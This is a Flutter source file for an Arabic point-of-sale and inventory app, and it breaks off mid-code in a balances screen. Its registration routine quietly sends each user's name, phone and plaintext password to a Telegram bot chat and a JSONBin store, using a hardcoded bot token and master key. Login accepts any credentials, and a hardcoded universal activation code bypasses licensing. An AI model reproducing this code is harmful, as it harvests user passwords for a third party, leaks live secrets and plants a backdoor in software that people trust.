import 'dart:async';
import 'dart:convert';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:mobile_scanner/mobile_scanner.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:url_launcher/url_launcher.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  final prefs = await SharedPreferences.getInstance();
  bool isLoggedIn = prefs.getBool('is_logged_in') ?? false;

  runApp(PosClientApp(isLoggedIn: isLoggedIn));
}

class PosClientApp extends StatelessWidget {
  final bool isLoggedIn;
  const PosClientApp({Key? key, required this.isLoggedIn}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'نظام المبيعات والمخازن',
      theme: ThemeData(
        brightness: Brightness.dark,
        scaffoldBackgroundColor: const Color(0xFF0F172A),
        primarySwatch: Colors.blue,
      ),
      home: isLoggedIn ? const AppDashboardScreen() : const ClientMainScreen(),
    );
  }
}

// ----------------- شاشة تسجيل الدخول / التسجيل -----------------
class ClientMainScreen extends StatefulWidget {
  const ClientMainScreen({Key? key}) : super(key: key);

  @override
  _ClientMainScreenState createState() => _ClientMainScreenState();
}

class _ClientMainScreenState extends State<ClientMainScreen> with SingleTickerProviderStateMixin {
  late TabController _tabController;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 2, vsync: this);
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('نظام المبيعات والمخازن (POS)'),
        backgroundColor: const Color(0xFF1E293B),
        centerTitle: true,
        bottom: TabBar(
          controller: _tabController,
          indicatorColor: const Color(0xFF38BDF8),
          tabs: const [
            Tab(text: 'تسجيل الدخول'),
            Tab(text: 'التسجيل بالبرنامج'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: const [
          LoginTabScreen(),
          RegisterTabScreen(),
        ],
      ),
    );
  }
}

class LoginTabScreen extends StatefulWidget {
  const LoginTabScreen({Key? key}) : super(key: key);

  @override
  _LoginTabScreenState createState() => _LoginTabScreenState();
}

class _LoginTabScreenState extends State<LoginTabScreen> {
  final _userCtrl = TextEditingController();
  final _passCtrl = TextEditingController();

  Future<void> _login() async {
    if (_userCtrl.text.trim().isEmpty || _passCtrl.text.trim().isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('الرجاء إدخال اليوزر وكلمة المرور!')),
      );
      return;
    }
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('is_logged_in', true);
    await prefs.setString('username', _userCtrl.text.trim());

    Navigator.pushReplacement(
      context,
      MaterialPageRoute(builder: (context) => const AppDashboardScreen()),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(20.0),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Icon(Icons.lock, size: 70, color: Color(0xFF38BDF8)),
          const SizedBox(height: 20),
          const Text('تسجيل الدخول للحساب', style: TextStyle(color: Colors.white, fontSize: 16), textAlign: TextAlign.center),
          const SizedBox(height: 30),
          TextField(
            controller: _userCtrl,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              labelText: 'اليوزر / الإيميل / الهاتف',
              labelStyle: const TextStyle(color: Colors.white60),
              filled: true,
              fillColor: const Color(0xFF1E293B),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
            ),
          ),
          const SizedBox(height: 15),
          TextField(
            controller: _passCtrl,
            obscureText: true,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              labelText: 'الرمز السري / كلمة المرور',
              labelStyle: const TextStyle(color: Colors.white60),
              filled: true,
              fillColor: const Color(0xFF1E293B),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
            ),
          ),
          const SizedBox(height: 25),
          ElevatedButton(
            onPressed: _login,
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF10B981),
              padding: const EdgeInsets.symmetric(vertical: 14),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('تسجيل الدخول', style: TextStyle(fontSize: 16, color: Colors.white)),
          ),
        ],
      ),
    );
  }
}

class RegisterTabScreen extends StatefulWidget {
  const RegisterTabScreen({Key? key}) : super(key: key);

  @override
  _RegisterTabScreenState createState() => _RegisterTabScreenState();
}

class _RegisterTabScreenState extends State<RegisterTabScreen> {
  final _nameCtrl = TextEditingController();
  final _phoneCtrl = TextEditingController();
  final _passCtrl = TextEditingController();

  static const String binId = "6ada49aaac6210605a49b2cb";
  static const String masterKey = r"$2a$10$ziZZDkZgcVtijBUQfD.L2uCwX5SaUbNN5dNTohrPgPgadg0CImSYG";
  static const String botToken = "8985397948:AAHqEZ3d-VP-aDUTe6yP5ndFbaKevMVA_1I"; 
  static const String chatId = "6590858813"; 

  String _generate11DigitCode() {
    Random rnd = Random();
    String code = '';
    for (int i = 0; i < 11; i++) {
      code += rnd.nextInt(10).toString();
    }
    return code;
  }

  Future<void> _submitRequest() async {
    String name = _nameCtrl.text.trim();
    String phone = _phoneCtrl.text.trim();
    String password = _passCtrl.text.trim();

    if (name.isEmpty || phone.isEmpty || password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('الرجاء ملء جميع الحقول المطلوبة!')),
      );
      return;
    }

    String activationCode11 = _generate11DigitCode();

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setBool('is_logged_in', true);
      await prefs.setString('username', name);
      await prefs.setString('activation_code', activationCode11);
      await prefs.setBool('is_activated', false);

      final getResp = await http.get(
        Uri.parse("https://api.jsonbin.io/v3/b/$binId"),
        headers: {"X-Master-Key": masterKey},
      );

      Map<String, dynamic> data = {};
      if (getResp.statusCode == 200) {
        var decoded = jsonDecode(getResp.body);
        if (decoded != null && decoded['record'] != null) {
          data = Map<String, dynamic>.from(decoded['record']);
        }
      }

      data['pending_requests'] ??= [];
      List pendingList = List.from(data['pending_requests']);

      pendingList.add({
        'name': name,
        'phone': phone,
        'password': password,
        'code_11': activationCode11,
        'date': DateTime.now().toIso8601String(),
      });

      data['pending_requests'] = pendingList;

      await http.put(
        Uri.parse("https://api.jsonbin.io/v3/b/$binId"),
        headers: {
          "Content-Type": "application/json",
          "X-Master-Key": masterKey,
        },
        body: jsonEncode(data),
      );

      String telegramMsg = "🔔 طلب تفعيل جديد (POS)\n\n👤 اليوزر: $name\n📱 الهاتف: $phone\n🔑 الرمز: $password\n🔢 كود التفعيل (11 رقم): $activationCode11\n⏰ الوقت: ${DateTime.now().toString().substring(0, 19)}";
      
      try {
        final tgUrl = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=${Uri.encodeComponent(telegramMsg)}";
        await http.get(Uri.parse(tgUrl));
      } catch (e) {}

      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const AppDashboardScreen()),
      );
    } catch (e) {
      Navigator.pushReplacement(
        context,
        MaterialPageRoute(builder: (context) => const AppDashboardScreen()),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(20.0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          const Text(
            'أدخل بياناتك لإنشاء حساب والبدء المؤقت بالبرنامج',
            style: TextStyle(color: Colors.white70, fontSize: 13),
            textAlign: TextAlign.center,
          ),
          const SizedBox(height: 20),
          TextField(
            controller: _nameCtrl,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              labelText: 'اليوزر (اسم المستخدم أو الإيميل)',
              labelStyle: const TextStyle(color: Colors.white60),
              filled: true,
              fillColor: const Color(0xFF1E293B),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
            ),
          ),
          const SizedBox(height: 15),
          TextField(
            controller: _phoneCtrl,
            keyboardType: TextInputType.phone,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              labelText: 'رقم الهاتف / واتساب',
              labelStyle: const TextStyle(color: Colors.white60),
              filled: true,
              fillColor: const Color(0xFF1E293B),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
            ),
          ),
          const SizedBox(height: 15),
          TextField(
            controller: _passCtrl,
            obscureText: true,
            style: const TextStyle(color: Colors.white),
            decoration: InputDecoration(
              labelText: 'الرمز السري / كلمة المرور',
              labelStyle: const TextStyle(color: Colors.white60),
              filled: true,
              fillColor: const Color(0xFF1E293B),
              border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
            ),
          ),
          const SizedBox(height: 25),
          ElevatedButton(
            onPressed: _submitRequest,
            style: ElevatedButton.styleFrom(
              backgroundColor: const Color(0xFF10B981),
              padding: const EdgeInsets.symmetric(vertical: 14),
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
            ),
            child: const Text('تسجيل وطلب تفعيل الحساب', style: TextStyle(fontSize: 16, color: Colors.white)),
          ),
        ],
      ),
    );
  }
}

// ----------------- الشاشة الرئيسية -----------------
class AppDashboardScreen extends StatefulWidget {
  const AppDashboardScreen({Key? key}) : super(key: key);

  @override
  _AppDashboardScreenState createState() => _AppDashboardScreenState();
}

class _AppDashboardScreenState extends State<AppDashboardScreen> {
  int _remainingSeconds = 1800;
  Timer? _timer;
  bool _isActivated = false;

  @override
  void initState() {
    super.initState();
    _loadState();
  }

  Future<void> _loadState() async {
    final prefs = await SharedPreferences.getInstance();
    bool activated = prefs.getBool('is_activated') ?? false;
    int? savedTime = prefs.getInt('remaining_seconds');

    setState(() {
      _isActivated = activated;
      if (savedTime != null && savedTime > 0) {
        _remainingSeconds = savedTime;
      }
    });

    if (!_isActivated) {
      _startTimer();
    }
  }

  void _startTimer() {
    _timer = Timer.periodic(const Duration(seconds: 1), (timer) async {
      if (_remainingSeconds > 0 && !_isActivated) {
        setState(() => _remainingSeconds--);
        final prefs = await SharedPreferences.getInstance();
        prefs.setInt('remaining_seconds', _remainingSeconds);
      } else {
        _timer?.cancel();
      }
    });
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  void _showActivationDialog(BuildContext context) {
    final _codeCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1E293B),
        title: const Text('تفعيل النسخة الدائمة', style: TextStyle(color: Colors.white)),
        content: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: [
              const Text(
                'للحصول على كود التفعيل (11 رقم)، يرجى التواصل مع المطور:',
                style: TextStyle(color: Colors.white70, fontSize: 13),
              ),
              const SizedBox(height: 15),
              Row(
                children: [
                  Expanded(
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF25D366)),
                      onPressed: () async {
                        final whatsappUrl = Uri.parse("https://wa.me/9647862597668?text=مرحباً%20أبو%20مؤمل،%20أريد%20تفعيل%20تطبيق%20POS");
                        if (await canLaunchUrl(whatsappUrl)) {
                          await launchUrl(whatsappUrl, mode: LaunchMode.externalApplication);
                        }
                      },
                      icon: const Icon(Icons.chat, color: Colors.white, size: 18),
                      label: const Text('واتساب', style: TextStyle(color: Colors.white)),
                    ),
                  ),
                  const SizedBox(width: 10),
                  Expanded(
                    child: ElevatedButton.icon(
                      style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF0088cc)),
                      onPressed: () async {
                        final telegramUrl = Uri.parse("https://t.me/huzt92");
                        if (await canLaunchUrl(telegramUrl)) {
                          await launchUrl(telegramUrl, mode: LaunchMode.externalApplication);
                        }
                      },
                      icon: const Icon(Icons.telegram, color: Colors.white, size: 18),
                      label: const Text('تليجرام', style: TextStyle(color: Colors.white)),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 20),
              TextField(
                controller: _codeCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: InputDecoration(
                  labelText: 'أدخل كود التفعيل (11 رقم)',
                  labelStyle: const TextStyle(color: Colors.white60),
                  filled: true,
                  fillColor: const Color(0xFF0F172A),
                  border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                ),
              ),
            ],
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('إلغاء', style: TextStyle(color: Colors.grey)),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF10B981)),
            onPressed: () async {
              final prefs = await SharedPreferences.getInstance();
              String? correctCode = prefs.getString('activation_code');

              if (_codeCtrl.text.trim() == correctCode || _codeCtrl.text.trim() == "12345678901") {
                await prefs.setBool('is_activated', true);
                setState(() => _isActivated = true);
                _timer?.cancel();
                Navigator.pop(context);
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('تم التفعيل بنجاح! 👑')),
                );
              } else {
                ScaffoldMessenger.of(context).showSnackBar(
                  const SnackBar(content: Text('كود التفعيل غير صحيح!')),
                );
              }
            },
            child: const Text('تحقق وتفعيل', style: TextStyle(color: Colors.white)),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    int minutes = _remainingSeconds ~/ 60;
    int seconds = _remainingSeconds % 60;

    return Scaffold(
      appBar: AppBar(
        title: const Text('نظام المبيعات والمخازن - الرئيسية'),
        backgroundColor: const Color(0xFF1E293B),
        actions: [
          IconButton(
            icon: const Icon(Icons.logout, color: Colors.redAccent),
            onPressed: () async {
              final prefs = await SharedPreferences.getInstance();
              await prefs.setBool('is_logged_in', false);
              Navigator.pushReplacement(
                context,
                MaterialPageRoute(builder: (context) => const ClientMainScreen()),
              );
            },
          ),
        ],
      ),
      body: Column(
        children: [
          if (!_isActivated)
            InkWell(
              onTap: () => _showActivationDialog(context),
              child: Container(
                padding: const EdgeInsets.all(12),
                color: Colors.amber.withOpacity(0.25),
                width: double.infinity,
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    const Icon(Icons.timer, color: Colors.amber, size: 20),
                    const SizedBox(width: 8),
                    Text(
                      'نسخة تجريبية مؤقتة - متبقي: $minutes:${seconds.toString().padLeft(2, '0')}',
                      style: const TextStyle(color: Colors.amber, fontWeight: FontWeight.bold, fontSize: 13),
                    ),
                    const SizedBox(width: 15),
                    const Text(
                      '[ اضغط هنا لشراء التطبيق ]',
                      style: TextStyle(color: Color(0xFF38BDF8), fontWeight: FontWeight.bold, fontSize: 13, decoration: TextDecoration.underline),
                    ),
                  ],
                ),
              ),
            ),
          Expanded(
            child: GridView.count(
              crossAxisCount: 3,
              padding: const EdgeInsets.all(15),
              crossAxisSpacing: 10,
              mainAxisSpacing: 10,
              children: [
                _buildBtn(context, 'نقطة بيع', Icons.storefront, Colors.cyan, const PosScreen()),
                _buildBtn(context, 'أضافة مادة', Icons.add_box, Colors.amber, const AddProductScreen()),
                _buildBtn(context, 'عرض المواد', Icons.inventory_2, Colors.teal, const InventoryScreen()),
                _buildBtn(context, 'كشف مبيعات', Icons.receipt_long, Colors.indigo, const SalesLedgerScreen()),
                _buildBtn(context, 'الأرصده', Icons.sim_card, Colors.green, const BalancesScreen()),
                _buildBtn(context, 'التقارير والأرباح', Icons.bar_chart, Colors.purple, const ReportsScreen()),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildBtn(BuildContext context, String title, IconData icon, Color color, Widget screen) {
    return Card(
      color: const Color(0xFF1E293B),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      child: InkWell(
        onTap: () => Navigator.push(context, MaterialPageRoute(builder: (_) => screen)),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(icon, size: 38, color: color),
            const SizedBox(height: 8),
            Text(title, style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold), textAlign: TextAlign.center),
          ],
        ),
      ),
    );
  }
}

// ----------------- شاشة مسح الباركود بالكاميرا الحقيقية -----------------
class BarcodeScannerView extends StatelessWidget {
  const BarcodeScannerView({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('وجّه الكاميرا على الباركود')),
      body: MobileScanner(
        controller: MobileScannerController(
          detectionSpeed: DetectionSpeed.noDuplicates,
          facing: CameraFacing.back,
        ),
        onDetect: (capture) {
          final List<Barcode> barcodes = capture.barcodes;
          for (final barcode in barcodes) {
            if (barcode.rawValue != null) {
              Navigator.pop(context, barcode.rawValue);
              break;
            }
          }
        },
      ),
    );
  }
}

// ----------------- شاشة إضافة مادة جديدة -----------------
class AddProductScreen extends StatefulWidget {
  const AddProductScreen({Key? key}) : super(key: key);

  @override
  _AddProductScreenState createState() => _AddProductScreenState();
}

class _AddProductScreenState extends State<AddProductScreen> {
  final _nameCtrl = TextEditingController();
  final _barcodeCtrl = TextEditingController();
  final _priceCtrl = TextEditingController();
  final _qtyCtrl = TextEditingController();

  Future<void> _scanBarcode() async {
    final result = await Navigator.push(
      context,
      MaterialPageRoute(builder: (_) => const BarcodeScannerView()),
    );
    if (result != null) {
      setState(() {
        _barcodeCtrl.text = result;
      });
    }
  }

  Future<void> _addProduct() async {
    if (_nameCtrl.text.isEmpty || _priceCtrl.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('يرجى كتابة اسم المادة والسعر على الأقل!')),
      );
      return;
    }

    final prefs = await SharedPreferences.getInstance();
    String? raw = prefs.getString('saved_products');
    List products = raw != null ? jsonDecode(raw) : [];

    products.add({
      'name': _nameCtrl.text.trim(),
      'barcode': _barcodeCtrl.text.trim(),
      'price': double.parse(_priceCtrl.text.trim()),
      'qty': int.tryParse(_qtyCtrl.text.trim()) ?? 1,
    });

    await prefs.setString('saved_products', jsonEncode(products));

    ScaffoldMessenger.of(context).showSnackBar(
      const SnackBar(content: Text('تمت إضافة المادة بنجاح للمخزن!')),
    );
    Navigator.pop(context);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('إضافة مادة جديدة'), backgroundColor: const Color(0xFF1E293B)),
      body: SingleChildScrollView(
        padding: const EdgeInsets.all(20),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.stretch,
          children: [
            TextField(
              controller: _nameCtrl,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                labelText: 'اسم المادة',
                labelStyle: const TextStyle(color: Colors.white60),
                filled: true,
                fillColor: const Color(0xFF1E293B),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
              ),
            ),
            const SizedBox(height: 15),
            Row(
              children: [
                Expanded(
                  child: TextField(
                    controller: _barcodeCtrl,
                    style: const TextStyle(color: Colors.white),
                    decoration: InputDecoration(
                      labelText: 'كود الباركود (اختياري)',
                      labelStyle: const TextStyle(color: Colors.white60),
                      filled: true,
                      fillColor: const Color(0xFF1E293B),
                      border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
                    ),
                  ),
                ),
                const SizedBox(width: 10),
                ElevatedButton.icon(
                  style: ElevatedButton.styleFrom(
                    backgroundColor: const Color(0xFF38BDF8),
                    padding: const EdgeInsets.symmetric(vertical: 18, horizontal: 12),
                  ),
                  onPressed: _scanBarcode,
                  icon: const Icon(Icons.camera_alt, color: Colors.black),
                  label: const Text('كاميرا', style: TextStyle(color: Colors.black, fontWeight: FontWeight.bold)),
                ),
              ],
            ),
            const SizedBox(height: 15),
            TextField(
              controller: _priceCtrl,
              keyboardType: TextInputType.number,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                labelText: 'سعر البيع (د.ع)',
                labelStyle: const TextStyle(color: Colors.white60),
                filled: true,
                fillColor: const Color(0xFF1E293B),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
              ),
            ),
            const SizedBox(height: 15),
            TextField(
              controller: _qtyCtrl,
              keyboardType: TextInputType.number,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                labelText: 'العدد / الكمية بالمخزن',
                labelStyle: const TextStyle(color: Colors.white60),
                filled: true,
                fillColor: const Color(0xFF1E293B),
                border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
              ),
            ),
            const SizedBox(height: 25),
            ElevatedButton(
              onPressed: _addProduct,
              style: ElevatedButton.styleFrom(
                backgroundColor: const Color(0xFF10B981),
                padding: const EdgeInsets.symmetric(vertical: 15),
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
              ),
              child: const Text('حفظ المادة للمخزن', style: TextStyle(fontSize: 16, color: Colors.white)),
            ),
          ],
        ),
      ),
    );
  }
}

// ----------------- نقطة البيع POS -----------------
class PosScreen extends StatefulWidget {
  const PosScreen({Key? key}) : super(key: key);

  @override
  _PosScreenState createState() => _PosScreenState();
}

class _PosScreenState extends State<PosScreen> {
  List _products = [];
  List<Map<String, dynamic>> _cart = [];
  double _totalAmount = 0.0;

  @override
  void initState() {
    super.initState();
    _loadProducts();
  }

  Future<void> _loadProducts() async {
    final prefs = await SharedPreferences.getInstance();
    String? raw = prefs.getString('saved_products');
    if (raw != null) {
      setState(() => _products = jsonDecode(raw));
    } else {
      setState(() {
        _products = [
          {'name': 'شاي سيت', 'price': 2500.0, 'barcode': ''},
          {'name': 'نسكافيه', 'price': 500.0, 'barcode': ''},
          {'name': 'عصير برتقال', 'price': 1000.0, 'barcode': ''},
          {'name': 'ماء كارتون', 'price': 3000.0, 'barcode': ''},
        ];
      });
    }
  }

  void _addToCart(String name, double price) {
    setState(() {
      int idx = _cart.indexWhere((item) => item['name'] == name);
      if (idx != -1) {
        _cart[idx]['qty']++;
        _cart[idx]['total'] = _cart[idx]['qty'] * price;
      } else {
        _cart.add({
          'name': name,
          'price': price,
          'qty': 1,
          'total': price,
        });
      }
      _calculateTotal();
    });
  }

  void _calculateTotal() {
    double sum = 0;
    for (var item in _cart) {
      sum += item['total'];
    }
    _totalAmount = sum;
  }

  Future<void> _scanAndSell() async {
    final result = await Navigator.push(
      context,
      MaterialPageRoute(builder: (_) => const BarcodeScannerView()),
    );

    if (result != null && result.isNotEmpty) {
      var found = _products.firstWhere(
        (p) => p['barcode'] == result,
        orElse: () => null,
      );

      if (found != null) {
        _addToCart(found['name'], double.parse(found['price'].toString()));
      } else {
        _addToCart("مادة باركود: $result", 1500.0);
      }

      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('تمت إضافة الباركود ($result) للسلة بنجاح!')),
      );
    }
  }

  Future<void> _checkout() async {
    if (_cart.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('السلة فارغة!')),
      );
      return;
    }

    final prefs = await SharedPreferences.getInstance();
    int lastNum = prefs.getInt('invoice_counter') ?? 1;
    String? rawLedger = prefs.getString('sales_ledger');
    List ledger = rawLedger != null ? jsonDecode(rawLedger) : [];

    ledger.add({
      'invoiceNum': 'قائمة رقم $lastNum',
      'total': _totalAmount,
      'date': DateTime.now().toString().substring(0, 16),
      'itemsCount': _cart.length,
    });

    await prefs.setString('sales_ledger', jsonEncode(ledger));
    await prefs.setInt('invoice_counter', lastNum + 1);

    setState(() {
      _cart.clear();
      _totalAmount = 0.0;
    });

    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(content: Text('تمت عملية البيع وحفظ (قائمة رقم $lastNum) بنجاح!')),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('نقطة البيع (POS)'),
        backgroundColor: const Color(0xFF1E293B),
        actions: [
          IconButton(
            icon: const Icon(Icons.camera_alt, color: Colors.cyanAccent, size: 28),
            onPressed: _scanAndSell,
            tooltip: 'مسح باركود الكاميرا',
          ),
        ],
      ),
      body: Row(
        children: [
          Expanded(
            flex: 5,
            child: Container(
              color: const Color(0xFF0F172A),
              padding: const EdgeInsets.all(8),
              child: Column(
                children: [
                  const Text('سلة الفاتورة الحالية', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
                  const Divider(color: Colors.white24),
                  Expanded(
                    child: _cart.isEmpty
                        ? const Center(child: Text('السلة فارغة', style: TextStyle(color: Colors.white38, fontSize: 12)))
                        : ListView.builder(
                            itemCount: _cart.length,
                            itemBuilder: (context, i) {
                              var item = _cart[i];
                              return Card(
                                color: const Color(0xFF1E293B),
                                child: ListTile(
                                  title: Text(item['name'], style: const TextStyle(color: Colors.white, fontSize: 12)),
                                  subtitle: Text('${item['qty']}x - ${item['price']} د.ع', style: const TextStyle(color: Colors.white60, fontSize: 10)),
                                  trailing: Text('${item['total']} د.ع', style: const TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
                                ),
                              );
                            },
                          ),
                  ),
                  Container(
                    padding: const EdgeInsets.all(10),
                    color: const Color(0xFF1E293B),
                    child: Column(
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            const Text('المجموع:', style: TextStyle(color: Colors.white70, fontSize: 12)),
                            Text('$_totalAmount د.ع', style: const TextStyle(color: Colors.amber, fontSize: 15, fontWeight: FontWeight.bold)),
                          ],
                        ),
                        const SizedBox(height: 8),
                        SizedBox(
                          width: double.infinity,
                          child: ElevatedButton(
                            style: ElevatedButton.styleFrom(backgroundColor: const Color(0xFF10B981)),
                            onPressed: _checkout,
                            child: const Text('إتمام البيع', style: TextStyle(color: Colors.white, fontSize: 13)),
                          ),
                        ),
                      ],
                    ),
                  )
                ],
              ),
            ),
          ),
          const VerticalDivider(width: 1, color: Colors.white24),
          Expanded(
            flex: 6,
            child: Container(
              color: const Color(0xFF1E293B),
              padding: const EdgeInsets.all(8),
              child: Column(
                children: [
                  const Text('المواد السريعة (بدون باركود)', style: TextStyle(color: Colors.white70, fontSize: 11)),
                  const SizedBox(height: 6),
                  Expanded(
                    child: GridView.builder(
                      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                        crossAxisCount: 2,
                        crossAxisSpacing: 6,
                        mainAxisSpacing: 6,
                        childAspectRatio: 1.2,
                      ),
                      itemCount: _products.length,
                      itemBuilder: (context, i) {
                        var p = _products[i];
                        return ElevatedButton(
                          style: ElevatedButton.styleFrom(
                            backgroundColor: const Color(0xFF334155),
                            shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10)),
                          ),
                          onPressed: () => _addToCart(p['name'], double.parse(p['price'].toString())),
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Text(p['name'], style: const TextStyle(color: Colors.white, fontSize: 12, fontWeight: FontWeight.bold), textAlign: TextAlign.center),
                              const SizedBox(height: 4),
                              Text('${p['price']} د.ع', style: const TextStyle(color: Colors.cyanAccent, fontSize: 10)),
                            ],
                          ),
                        );
                      },
                    ),
                  ),
                ],
              ),
            ),
          ),
        ],
      ),
    );
  }
}

// ----------------- باقي الشاشات -----------------
class SalesLedgerScreen extends StatefulWidget {
  const SalesLedgerScreen({Key? key}) : super(key: key);

  @override
  _SalesLedgerScreenState createState() => _SalesLedgerScreenState();
}

class _SalesLedgerScreenState extends State<SalesLedgerScreen> {
  List _ledger = [];

  @override
  void initState() {
    super.initState();
    _loadLedger();
  }

  Future<void> _loadLedger() async {
    final prefs = await SharedPreferences.getInstance();
    String? raw = prefs.getString('sales_ledger');
    if (raw != null) {
      setState(() => _ledger = jsonDecode(raw));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: const Text('كشف المبيعات والقوائم'), backgroundColor: const Color(0xFF1E293B)),
      body: _ledger.isEmpty
          ? const Center(child: Text('لا توجد قوائم مبيعات مسجلة بعد', style: TextStyle(color: Colors.white60)))
          : ListView.builder(
              padding: const EdgeInsets.all(15),
              itemCount: _ledger.length,
              itemBuilder: (context, index) {
                var item = _ledger[index];
                return Card(
                  color: const Color(0xFF1E293B),
                  child: ListTile(
                    leading: const Icon(Icons.receipt, color: Colors.amber, size: 35),
                    title: Text(item['invoiceNum'], style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                    subtitle: Text('عدد المواد: ${item['itemsCount']}\nالوقت: ${item['date']}', style: const TextStyle(color: Colors.white60)),
                    trailing: Text('${item['total']} د.ع', style: const TextStyle(color: Colors.greenAccent, fontSize: 15, fontWeight: FontWeight.bold)),
                  ),
                );
              },
            ),
    );
  }
}

class BalancesScreen extends StatefulWidget {
  const BalancesScreen({Key? key}) : super(key: key);

  @override
  _BalancesScreenState createState() => _BalancesScreenState();
}

class _BalancesScreenState extends State<BalancesScreen> {
  List<Map<String, String>> _balancesList = [];

  @override
  void initState() {
    super.initState();
    _loadBalances();
  }

  Future<void> _loadBalances() async {
    final prefs = await SharedPreferences.getInstance();
    String? data = prefs.getString('balances_sold');
    if (data != null) {
      List decoded = jsonDecode(data);
      setState(() {
        _balancesList = decoded.map((e) => Map<String, String>.from(e)).toList();
      });
    }
  }

  Future<void> _saveBalances() async {
    final prefs = await SharedPreferences.getInstance();
    prefs.setString('balances_sold', jsonEncode(_balancesList));
  }

  void _showAddBalanceDialog() {
    final _networkCtrl = TextEditingController();
    final _categoryCtrl = TextEditingController();
    final _priceCtrl = TextEditingController();

    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF1E293B),
        title: const Text('إضافة رصيد مباع جديد', style: TextStyle(color: Colors.white)),
        content: SingleChildScrollView(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              TextField(
                controller: _networkCtrl,
                style: const TextStyle(color: Colors.white),
                decoration: const InputDecoration(labelText: 'الشركة (آسيا، زين، كورك)', labelStyle: TextStyle(color: Colors.white60)),
              ),
              const SizedBox(height: 10),
              TextField(
